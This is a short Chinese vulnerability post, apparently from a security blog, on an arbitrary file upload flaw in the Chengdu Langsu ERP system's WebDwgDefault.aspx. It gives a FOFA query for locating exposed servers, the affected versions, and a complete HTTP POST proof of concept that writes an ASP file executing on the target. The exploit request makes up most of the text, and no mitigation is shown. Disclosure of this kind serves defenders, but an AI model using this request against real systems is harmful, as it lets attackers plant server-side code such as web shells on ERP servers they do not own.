#  成都朗速ERP系统WebDwgDefault.aspx任意文件上传漏洞   
清晨  摸鱼划水   2025-05-29 02:49  
  
FOFA  
```
body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
```  
  
影响版本  
```
Web_v8及以下版本（其他版本需进一步验证）
```  
  
POC  
```
# 文件上传位置：/test.asp
POST /WebDwgDefault.aspx?IsSave=true&FileName=test.asp HTTP/1.1
Host: ip:port
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----123
Content-Length: 331

------123
Content-Disposition: form-data; name="file"; filename="aaaaaaaaa.txt"

<% 
Response.Write("vmvtjelciqfadnyakpjmdduxscigdaee")
%>
------123--
```  
  
漏洞来源：  
  
[成都朗速ERP系统高危漏洞曝光！任意文件上传（附修复方案）](https://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247490564&idx=1&sn=b21020d985bae3bd807b1e3a8eb8d14a&scene=21#wechat_redirect)  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qJ5apkMXic81tULhQZicpM6a34ibBWF2PIvjE14tRodiaiaUTUsbPPDtibYUn3R0bqZA24jSyict3gyHNMTRvIYOauTIQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
